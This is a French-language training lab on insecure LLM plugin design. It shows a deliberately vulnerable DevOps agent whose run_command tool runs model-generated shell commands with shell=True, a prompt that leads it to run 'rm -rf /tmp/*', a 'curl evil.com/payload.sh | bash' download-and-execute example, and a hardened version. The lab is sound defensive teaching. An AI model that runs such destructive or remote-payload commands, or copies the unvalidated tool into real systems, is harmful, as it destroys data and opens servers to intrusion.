# Lab LLM07: Insecure Plugin Design

## 1️⃣ Description du risque (OWASP-style)

La conception de plugins non sécurisés (Insecure Plugin Design) expose les applications LLM à des risques majeurs lorsque ces plugins interagissent avec des systèmes externes. Les plugins (ou "tools") étendent les capacités des LLM en leur permettant d'accéder à des API, d'exécuter du code, ou de récupérer des données en temps réel. Si ces plugins manquent de contrôles d'accès stricts et de validation des entrées, ils deviennent des vecteurs d'attaque puissants.

-   **Impact Sécurité :** Exécution de code à distance (RCE), escalade de privilèges, accès non autorisé à des ressources internes (SSRF), et manipulation de systèmes critiques (bases de données, serveurs).
-   **Impact Business :** Compromission complète de l'infrastructure, perte de contrôle sur les actions automatisées, et atteinte à la réputation si des actions nuisibles sont effectuées au nom de l'entreprise.
-   **Impact Conformité :** Si un plugin non sécurisé permet de manipuler des données financières ou personnelles, cela peut entraîner de graves violations réglementaires.

Cette vulnérabilité est très réaliste car la puissance des "LLM Agents" réside dans leur capacité à utiliser des outils. Les développeurs, pressés de fournir des fonctionnalités, peuvent créer des plugins trop permissifs, mal valider les entrées provenant du LLM, ou parser les réponses de manière dangereuse.

## 2️⃣ Contexte du lab (scénario réel)

-   **Entreprise :** Une équipe DevOps d'une entreprise de cloud.
-   **Rôle du LLM :** L'équipe a créé un "DevOps Assistant" nommé "OpsBot". Cet agent LLM est intégré à leur système de chat (Slack/Teams) et est conçu pour automatiser des tâches de routine, comme vérifier le statut des services, redémarrer des serveurs, ou consulter des métriques.
-   **Plugins/Tools :** OpsBot a accès à une suite de "tools", dont un plugin `run_command` qui lui permet d'exécuter des commandes shell sur un serveur de management pour des diagnostics rapides.

## 3️⃣ Mauvaise implémentation (VOLONTAIRE)

L'erreur de conception est double : le plugin `run_command` est beaucoup trop permissif (il peut exécuter n'importe quelle commande) et il ne dispose d'aucun mécanisme d'approbation humaine pour les commandes potentiellement dangereuses.

-   **Architecture Vulnérable :**
    `User Prompt → LLM Agent → Tool Selection: run_command → **LLM-generated Command** → `os.system()` → Server Execution`
-   **Hypothèse Dangereuse :** "Le LLM est aligné pour être un assistant utile, il ne générera donc que des commandes shell sûres et pertinentes pour le DevOps, comme `kubectl get pods` ou `systemctl status nginx`."
-   **Décision Technique Incorrecte :**
    1.  Le plugin accepte n'importe quelle chaîne de caractères comme commande, sans liste blanche (allow-list) de commandes sûres.
    2.  Les commandes sont exécutées directement via une fonction dangereuse comme `os.system()` ou `subprocess.run(..., shell=True)`.
    3.  Il n'y a pas de confirmation manuelle demandée à l'opérateur humain avant d'exécuter une commande, en particulier celles qui modifient l'état du système (`rm`, `mv`, `shutdown`).
-   **Mitigations Actives :** Aucune.

## 4️⃣ Implémentation technique vulnérable

-   **Architecture :** Une application Flask simulant un agent LLM qui peut décider d'appeler une fonction "tool".

-   **Code du Plugin/Tool Vulnérable :**
    ```python
    # tools.py
    import os
    import subprocess

    def run_command(command: str) -> str:
        """
        Executes a shell command on the management server.
        WARNING: This tool is extremely powerful. Use with caution.
        - command (str): The shell command to execute.
        Returns the stdout and stderr of the command.
        """
        try:
            # ❌ CRITICAL FLAW: Lack of input validation and direct execution
            # of a command string generated by the LLM.
            result = subprocess.run(
                command,
                shell=True, # shell=True is particularly dangerous
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0:
                return f"Command executed successfully. Output:\n{result.stdout}"
            else:
                return f"Command failed. Stderr:\n{result.stderr}"
        except Exception as e:
            return f"An error occurred: {str(e)}"
    ```

-   **Code de l'Agent LLM (Simulation) :**
    ```python
    # agent.py
    import json
    import ollama
    # ... (imports, client setup)

    # Simplified simulation of an agent loop
    def process_user_request(user_prompt):
        system_prompt = f"""
    You are OpsBot, a DevOps assistant. You have access to tools.
    Based on the user's request, decide if you need to call a tool.
    If you call a tool, respond in the format:
    TOOL_CALL: {{ "name": "tool_name", "arguments": {{"arg1": "value1"}} }}

    Available Tools:
    - run_command(command: str): Executes a shell command on the server.
    """
        response = ollama.chat(model="llama3", messages=[...]) # Call to LLM
        llm_output = response['message']['content']

        if "TOOL_CALL:" in llm_output:
            # In a real app, this would be a robust JSON parser
            tool_call_str = llm_output.split("TOOL_CALL:")[1].strip()
            tool_call_data = json.loads(tool_call_str)

            if tool_call_data["name"] == "run_command":
                command_args = tool_call_data["arguments"]
                # ❌ The command generated by the LLM is executed directly
                return run_command(command_args["command"])
        else:
            return llm_output
    ```

## 5️⃣ Scénario d’attaque

-   **Objectif de l’attaquant :** Un utilisateur autorisé à interagir avec OpsBot (par exemple, un développeur) veut abuser de la confiance que le système place dans le LLM pour exécuter des commandes arbitraires sur le serveur de management.
-   **Étapes de l’attaque :**
    1.  L'attaquant interagit avec OpsBot.
    2.  Il crafte un prompt d'injection indirecte. Au lieu de demander directement d'exécuter une commande malveillante, il demande au LLM d'effectuer une tâche qui, pour un LLM, semble légitime mais nécessite l'exécution d'une commande dangereuse.
-   **Payload / Prompt Malveillant (Injection Indirecte) :**
    `"The server is running out of disk space. Please analyze the temporary files and then clean up the '/tmp' directory to free up space."`

## 6️⃣ Résultat attendu (attaque réussie)

-   **Comportement dangereux observé :** Le LLM, cherchant à être un "assistant DevOps utile", interprète la demande. Il sait que pour "analyser" et "nettoyer" des fichiers, les commandes `ls` et `rm` sont appropriées.
-   **Génération de commande dangereuse :** Le LLM génère une réponse comme :
    `TOOL_CALL: { "name": "run_command", "arguments": {"command": "ls -la /tmp && rm -rf /tmp/*"} }`
-   **Exécution non autorisée :** Le code de l'agent reçoit cette réponse, extrait la commande `ls -la /tmp && rm -rf /tmp/*` et l'exécute via le plugin `run_command`.
-   **Impact :** Tous les fichiers temporaires sur le serveur de management sont supprimés, ce qui peut provoquer une panne majeure du système. L'attaquant aurait pu tout aussi bien demander de télécharger et d'exécuter un script depuis un serveur externe (`curl evil.com/payload.sh | bash`).

## 8️⃣ Correction sécurisée (BEST PRACTICES)

-   **Liste Blanche (Allow-listing) :** Le tool ne doit accepter qu'un ensemble prédéfini et limité de commandes sûres et paramétrées. N'autorisez jamais l'exécution de commandes arbitraires.
-   **Approbation Humaine :** Pour toute action sensible ou destructrice (suppression de fichiers, redémarrage de services), le tool ne doit pas exécuter la commande directement. Il doit la proposer à l'opérateur humain et attendre une approbation explicite (par exemple, un clic sur un bouton "Oui, exécuter").
-   **Principe de Moindre Privilège :** Concevez des tools plus granulaires. Au lieu d'un `run_command` générique, créez des tools spécifiques comme `get_pod_status(pod_name: str)`, `read_log_file(service_name: str, lines: int)`. Chaque tool n'a que les permissions strictement nécessaires à sa tâche.
-   **Validation des Paramètres :** Validez et sanitarisez rigoureusement tous les arguments passés aux tools. Par exemple, si un tool attend un nom de service, assurez-vous que la chaîne ne contient pas de caractères de commande shell (`;`, `|`, `&&`).

## 9️⃣ Version sécurisée (implémentation corrigée)

-   **Code des Tools Sécurisés :**
    ```python
    # tools_secure.py

    # ✅ DEFENSE 1: Granular, safe tools instead of a generic one.
    def get_disk_usage(path: str = "/tmp") -> str:
        # Parameter validation
        if not path.startswith("/"):
            return "Error: Only absolute paths are allowed."
        # Uses a safe, specific command. No shell=True.
        result = subprocess.run(["df", "-h", path], capture_output=True, text=True)
        return result.stdout

    def list_files(path: str = "/tmp") -> str:
        # ... similar safe implementation using ["ls", "-la", path]
        return "..."

    # ✅ DEFENSE 2: A tool that requires human approval for dangerous actions.
    def request_file_cleanup(path: str = "/tmp") -> str:
        # This tool does NOT execute the command. It generates a request.
        return f"APPROVAL_REQUEST: A request to clean up the directory '{path}' has been generated. An administrator must approve it."
    ```

-   **Logique de l'Agent Sécurisé :**
    ```python
    # agent_secure.py

    # The agent now has a list of safe tools.
    AVAILABLE_TOOLS = {
        "get_disk_usage": get_disk_usage,
        "list_files": list_files,
        "request_file_cleanup": request_file_cleanup,
    }

    def process_user_request_secure(user_prompt):
        # ... (LLM is now told to use the new, safer tools)

        # When a tool call is received...
        tool_name = tool_call_data["name"]
        tool_args = tool_call_data["arguments"]

        if tool_name in AVAILABLE_TOOLS:
            tool_function = AVAILABLE_TOOLS[tool_name]
            # Execute the safe tool
            result = tool_function(**tool_args)

            # ✅ DEFENSE 3: Handle approval requests separately
            if result.startswith("APPROVAL_REQUEST:"):
                # Send a message to a human operator for approval
                send_approval_to_slack(result)
                return "I have requested approval for this action."
            else:
                return result
        else:
            return "Error: The LLM requested an unknown tool."
    ```
-   **Explication :** La version sécurisée remplace le `run_command` omnipotent par des fonctions spécifiques et sûres. Pour les actions dangereuses comme le nettoyage de fichiers, le système ne fait plus confiance au LLM pour l'exécuter. Il transforme la décision du LLM en une simple *demande d'approbation*, déplaçant la responsabilité finale de l'action vers un opérateur humain.
